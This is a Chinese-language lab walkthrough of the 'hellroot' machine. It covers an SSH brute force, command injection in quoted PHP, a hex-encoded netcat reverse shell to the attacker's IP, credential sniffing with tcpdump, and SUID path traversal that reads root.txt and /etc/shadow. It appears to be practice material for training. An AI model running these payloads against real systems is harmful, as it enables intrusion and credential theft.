好的，这是根据您提供的思路和要求优化后的文章。

# **一、信息收集**

首先，对目标网段进行主机发现。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.144 08:00:27:d0:16:be       PCS Systemtechnik GmbH
...
```

确定目标主机IP为 `192.168.205.144` 后，对其进行全端口扫描，发现开放了多个服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.144
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
443/tcp  open  https
5000/tcp open  upnp
...
```

# **二、捷径：SSH爆破**

在深入探索之前，发现了一个极其简单的提权路径。通过对SSH服务进行弱口令爆破，可以迅速获得root权限。

准备一个简单的用户字典：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'root\nadmin\n' > user
```

使用`hydra`工具和一个常用密码字典（此处为`5000q.txt`）进行爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -L user -P 5000q.txt ssh://192.168.205.144 -f -I -u -e nsr -t 64 
...
[22][ssh] host: 192.168.205.144   login: root   password: 12345
...
```

成功爆破出root用户的密码为 `12345`。直接登录即可完成靶机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh root@192.168.205.144
...
root@hellroot:~# cat /home/astro/user.txt /root/root.txt 
f220dcf45ccfc10c4c44ea8c413186f2
f039facf1ae0d69b07484df1c4da32df
```

# **三、常规路径：Web渗透**

接下来，我们探索预设的、更具挑战性的攻击路径。

## **1. Gitea代码审计**

访问目标80端口，页面为Apache默认页，无可用信息。访问443端口，发现页面跳转至 `git.hellroot.thl`。我们将此域名与目标IP绑定到 `/etc/hosts` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts
192.168.205.144 git.hellroot.thl
```

重新访问 `https://git.hellroot.thl`，发现是一个 Gitea 服务（版本1.24.3）。其中存在一个名为 `Astro/hellroot.thl` 的公开代码仓库。

在仓库的 `Dockerfile` 文件中，发现了一组凭据：`astro:iloveastro`。

在 `index.php` 文件中，我们审计到一段存在命令执行漏洞的代码。该代码运行在5000端口。

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {
    $input = trim($_POST['domain']);
    $decoded = @hex2bin($input);

    // ...

    if ($decoded !== false && ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1'); // 存在命令注入
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
    } else {
        // ...
    }
    // ...
}
?>
```

代码逻辑显示，如果POST请求的`domain`参数经过十六进制解码后包含分号`;`，则会直接拼接到`shell_exec`函数中执行，造成远程命令执行（RCE）漏洞。

## **2. RCE漏洞利用**

我们可以将任意命令转换为十六进制字符串来绕过过滤并执行。首先，测试`id;`命令，其十六进制为`69643b`。在5000端口的服务上提交该payload，成功执行。

为了获取一个交互式Shell，我们构造一个反弹Shell的payload。目标主机存在`nc`，因此使用`nc`进行反弹。

**Payload**: `nc 192.168.205.128 8888 -e /bin/bash;`
**Hex编码**: `6e63203139322e3136382e3230352e3132382038383838202d65202f62696e2f626173683b`

在Kali上开启监听，并提交上述Payload，成功接收到反弹Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 59278
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

当前用户为 `www-data`，这是一个Docker容器内的低权限用户。

# **四、Docker内提权与流量嗅探**

在当前目录下发现一个提示文件`sniff.txt`，内容为西班牙语，意为“有些工具可以让你嗅探流量”。同时在`.config/dpkg-l.txt`文件中发现系统安装了`tcpdump`。

这提示我们需要进行流量抓包。使用之前在`Dockerfile`中找到的密码 `astro:iloveastro` 切换到`astro`用户。

```bash
www-data@05cc10128c04:/var/www/html$ su astro
Password: iloveastro
$
```

查看`astro`用户的`sudo`权限，发现其可以无密码切换到root。

```bash
astro@05cc10128c04:/var/www/html$ sudo -l
...
User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
```

切换到root用户，并使用`tcpdump`在`eth0`网卡上进行抓包。

```bash
astro@05cc10128c04:/var/www/html$ sudo su
root@05cc10128c04:/var/www/html# tcpdump -i eth0 -A -w /tmp/a.pcap
```

让`tcpdump`运行一段时间后，将抓取到的数据包`a.pcap`传送到Kali攻击机进行分析。

使用Wireshark打开`a.pcap`，通过HTTP协议过滤器，发现一个POST请求，其中包含一个登录凭据。这很可能是主机上的定时任务在执行。

*   **username**: `astro`
*   **password**: `wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS`

# **五、主机提权**

我们获得了主机`astro`用户的密码，现在可以从Docker容器横向移动到主机系统。

使用新密码SSH登录主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh astro@192.168.205.144
...
astro@hellroot:~$ 
```

登录后，寻找提权方法。首先检查SUID文件。

```bash
astro@hellroot:~$ find / -perm -4000 -type f 2>/dev/null
...
/usr/local/bin/secmonitor
/usr/local/bin/logview
...
```

发现两个可疑的自定义SUID程序：`secmonitor`和`logview`。逐一进行测试。

`logview`程序用于查看日志文件，但其实现存在目录穿越漏洞。程序会将用户输入的文件名拼接到`/var/log/`目录下，但未对`../`进行过滤。

```bash
astro@hellroot:~$ /usr/local/bin/logview /root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log//root/root.txt
fopen: No such file or directory
```

利用目录穿越漏洞，我们可以读取任意文件，例如`root.txt`。

```bash
astro@hellroot:~$ /usr/local/bin/logview ../../../root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log/../../../root/root.txt
f039facf1ae0d69b07484df1c4da32df
```

同理，我们可以读取 `/etc/shadow` 文件，获取所有用户的密码哈希。将root用户的哈希进行破解，可以得到密码为`12345`，与最初SSH爆破的结果一致。至此，通过常规路径也成功获取了root权限。